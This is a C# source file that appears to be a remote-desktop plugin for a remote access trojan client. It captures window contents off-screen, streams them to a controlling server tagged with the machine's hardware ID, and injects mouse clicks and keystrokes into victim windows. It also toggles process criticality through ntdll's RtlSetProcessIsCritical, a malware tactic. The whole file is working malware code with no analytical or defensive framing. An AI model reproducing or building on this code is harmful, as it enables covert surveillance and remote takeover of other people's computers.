using MessagePackLib.MessagePack;
using Plugin.StreamLibrary;
using Plugin.StreamLibrary.src;
using Plugin.StreamLibrary.UnsafeCodecs;
using System;
using Client.Connection;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

using System.Collections.Generic;
using Client.Helper;
using Client.Helper.Browser;
using System.Diagnostics;

namespace Plugin
{
    public static class Packet
    {

        public static bool IsOk { get; set; }

        public static IntPtr handle = (IntPtr)0;


        public static IntPtr lastActive = (IntPtr)0;
        public static String Scrn;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        private static WindowSnapCollection windowSnaps;
        public static void Read(object data)
        {

            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);


            try
            {
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "remoteDesktop":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "capture":
                                    {
                                        if (IsOk == true) return;
                                        IsOk = true;
                                        CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), unpack_msgpack.ForcePathObject("Screen").AsString);
                                        break;
                                    }

                                case "mouseClick":
                                    {
                                        //Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
                                        // Cursor.Position = position;

                                        Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
                                        SendClick(unpack_msgpack.ForcePathObject("Button").AsString, position);
                                        break;
                                    }



                                case "stop":
                                    {
                                        IsOk = false;
                                        break;
                                    }

                                case "keyboardClick":
                                    {
                                        bool keyDown = Convert.ToBoolean(unpack_msgpack.ForcePathObject("keyIsDown").AsString);
                                        byte key = Convert.ToByte(unpack_msgpack.ForcePathObject("key").AsInteger);
                                        sendKey(key, lastActive, keyDown);
                                        break;
                                    }
                                case "Close":
                                    {


                                        try
                                        {

                                            try
                                            {
                                                RtlSetProcessIsCritical(0, 0, 0);
                                            }
                                            catch
                                            {
                                                while (true)
                                                {
                                                    Thread.Sleep(100000); //prevents a BSOD on exit failure
                                                }
                                            }
                                           
                                            ClientSocket.SslClient?.Close();
                                            ClientSocket.TcpClient?.Close();
                                        }
                                        catch { }
                                        Environment.Exit(0);


                                        break;
                                    }

                            }
                            break;
                        }
                }


            }
            catch (Exception ex)
            {
                Error(ex.ToString());
            }
        }

        public static void CaptureAndSend(int quality, string Scrn)
        {
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            MsgPack msgpack;
            IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
            MemoryStream stream;

            var bounds = Screen.GetBounds(Point.Empty);
            while (IsOk && ClientSocket.IsConnected)
            {
                try
                {
                    bmp = RenderScreenShot();
                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = Client.Settings.Hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                            new Thread(() => { ClientSocket.Send(msgpack.Encode2Bytes()); }).Start();
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                    Thread.Sleep(100);
                }
                catch (Exception ex)
                {
                    ClientSocket.ReportError(ex.ToString());
                    ClientSocket.Disconnected();
                    break;
                }

                
            }
            try
            {
                IsOk = false;
                bmp?.UnlockBits(bmpData);
                bmp?.Dispose();

                GC.Collect();
            }
            catch { }
        }


       


        private static Bitmap RenderScreenShot()
        {

            IntPtr taskBar = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Shell_TrayWnd", null);
            IntPtr desktopHwnd = FindWindowEx(GetDesktopWindow(), IntPtr.Zero, "Progman", "Program Manager");

            HashSet<IntPtr> ForbiddenWindows = new HashSet<IntPtr>();
            ForbiddenWindows.Add(desktopHwnd);

            ForbiddenWindows.Add(taskBar);

            var bounds = Screen.GetBounds(Point.Empty);


            Bitmap original = new Bitmap(bounds.Width, bounds.Height);

            WindowSnapCollection windowSnaps = new WindowSnapCollection();

            List<IntPtr> t = new List<IntPtr>();
            EnumDelegate lpEnumCallbackFunction = (EnumDelegate)((hWnd, lParam) =>
            {
                bool flag = false;
                try
                {


                    if (hWnd == IntPtr.Zero) return false;
                    if (IsIconic(hWnd)) return true;

                    if (IsWindowVisible(hWnd))
                    {
                        t.Add(hWnd);
                        String path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\img.png";

                        var snap = WindowSnap.GetWindowSnap(hWnd, true);


                        if (!snap.Location.IsEmpty || ForbiddenWindows.Contains(snap.Handle) || !string.IsNullOrEmpty(snap.Text))
                            windowSnaps.Add(snap);

                    }

                    return true;
                }
                catch (Exception ex)
                {
                    return flag;
                }
            });

            if (!EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero))
            {
                throw new Exception("EnumDesktop Fucked Up");

            }

            windowSnaps.Reverse();
            foreach (var snap in windowSnaps)
            {
                if (snap.Image != null)
                {

                    if (!snap.Text.Contains("Microsoft Text Input Application"))

                    {
                        
                        Graphics.FromImage((Image)original).DrawImage((Image)snap.Image, snap.Location.X, snap.Location.Y);

                    }
                }

            }

            return original;
        }
        [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
        static extern IntPtr GetDesktopWindow();

        private delegate bool EnumDelegate(IntPtr hWnd, int lParam);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

        [DllImport("user32.dll")]
        static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpfn, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("user32")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsIconic(IntPtr hWnd);


        public static string GetWindowTitle(IntPtr hWnd)
        {
            var length = GetWindowTextLength(hWnd) + 1;
            var title = new StringBuilder(length);
            GetWindowText(hWnd, title, length);
            return title.ToString();
        }

      





        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(int hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);


        public enum WMessages : int
        {
            WM_LBUTTONDOWN = 0x201,
            WM_LBUTTONUP = 0x202,

            WM_KEYDOWN = 0x100,
            WM_KEYUP = 0x101,

            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14,
        }

        public static void sendKey(byte keyCode, IntPtr hwnd, bool keyDown)
        {
            const uint WM_KEYDOWN = 0x0100;
            const uint WM_KEYUP = 0x0101;


            if (keyDown)
            {
                uint scanCode = NativeMethods.MapVirtualKey((uint)keyCode, 0);
                uint lParam;
                // 
                //KEY DOWN
                lParam = (0x00000001 | (scanCode << 16));
                //if (extended)
                //{
                //    lParam |= 0x01000000;
                //}
                NativeMethods.PostMessage(hwnd, (int)WM_KEYDOWN, (IntPtr)keyCode, (IntPtr)0x0);
            }
            else
            {
                uint scanCode = NativeMethods.MapVirtualKey((uint)keyCode, 0);
                uint lParam;
                // 
                //KEY DOWN
                lParam = (0xC0000001 | (scanCode << 16));
                //KEY UP
                //lParam |= 0xC0000001;  // set previous key and transition states (bits 30 and 31)
                NativeMethods.PostMessage(hwnd, (int)WM_KEYUP, (IntPtr)keyCode, (IntPtr)lParam);
            }



        }


        [DllImport("user32.dll")]
        static extern IntPtr ChildWindowFromPointEx(IntPtr hWndParent, Point pt, uint uFlags);

        [DllImport("user32.dll")]
        public static extern IntPtr WindowFromPoint(Point Point);

        public static void SendClick(string type, Point pos)
        {
            IntPtr intPtr = WindowFromPoint(pos);

            lastActive = intPtr;

            switch (type)
            {
                case "WM_LBUTTONDOWN":
                    DoMouseLeftClick(pos, intPtr, true);
                    return;
                case "WM_LBUTTONUP":
                    DoMouseLeftClick(pos, intPtr, false);
                    return;
                default:
                    return;
            }
        }


       


        public static void DoMouseLeftClick(Point p, IntPtr handle, bool isMouseDown)
        {

            Outils.RECT lpRect = new Outils.RECT();
            int num2 = Outils.GetWindowRect(handle, ref lpRect) ? 1 : 0;
            Point point = new Point(checked(p.X - lpRect.Left), checked(p.Y - lpRect.Top));

            if (isMouseDown)
            {
                NativeMethods.PostMessage(handle, 0x0201, (IntPtr)1, (IntPtr)MakeLParam(point.X, point.Y));

            }
            else
            {
                NativeMethods.PostMessage(handle, 0x0202, (IntPtr)1, (IntPtr)MakeLParam(point.X, point.Y));
            }
        }
        public static int MakeLParam(int x, int y) => (y << 16) | (x & 0xFFFF);


        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
        const Int32 CURSOR_SHOWING = 0x00000001;

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }

    }
}
